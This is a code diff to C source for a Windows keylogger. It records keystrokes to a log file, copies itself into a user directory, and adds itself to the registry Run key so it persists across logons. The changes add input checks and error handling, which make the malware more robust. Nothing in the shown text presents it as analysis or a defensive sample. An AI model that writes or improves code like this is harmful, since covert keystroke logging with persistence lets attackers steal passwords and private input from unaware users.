@@ -5,10 +5,20 @@ int altPressed = 0;
 int ctrlPressed = 0;
 
 void logKey(const char *input) {
+    if (!input || *input == '\0') return;
+    
     FILE *file = fopen(LOGFILE, "a");
-    if (file) {
-        fputs(input, file);
-        fclose(file);
+    if (!file) {
+        perror("Error opening log file");
+        return;
+    }
+    
+    if (fputs(input, file) == EOF) {
+        perror("Error writing to log file");
+    }
+    
+    if (fclose(file) == EOF) {
+        perror("Error closing log file");
     }
 }
 
@@ -141,8 +151,9 @@ void handleKeyRelease(int key) {
 }
 
 void create_directory(char *targetPath) {
+    if (!targetPath) return;
+    
     struct stat st = {0};
-
     if (stat(targetPath, &st) == -1) {
         if (_mkdir(targetPath) == 0) {
             printf("Directory created successfully: %s\n", targetPath);
@@ -155,6 +166,8 @@ void create_directory(char *targetPath) {
 }
 
 void copyToSystemLocation(char *targetPath) {
+    if (!targetPath) return;
+    
     char username[256];
     DWORD username_len = sizeof(username);
 
@@ -175,6 +188,11 @@ void copyToSystemLocation(char *targetPath) {
         return;
     }
 
+    if (access(targetPath, F_OK) != -1) {
+        printf("File already exists at target location: %s\n", targetPath);
+        return;
+    }
+    
     if (!CopyFile(OLDFILE, targetPath, FALSE)) {
         DWORD dwError = GetLastError();
         printf("Error copying file. Error code: %lu\n", dwError);
@@ -184,9 +202,11 @@ void copyToSystemLocation(char *targetPath) {
 }
 
 void setRegistryPersistence(const char *targetPath) {
+    if (!targetPath) return;
+    
     HKEY hKey;
-
-    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
+    LONG result = RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+    if (result == ERROR_SUCCESS) {
         RegSetValueEx(hKey, REGISTERY_NAME, 0, REG_SZ, (LPBYTE)targetPath, (DWORD)(strlen(targetPath) + 1));
         RegCloseKey(hKey);
         printf("Registry persistence set for: %s\n", targetPath);
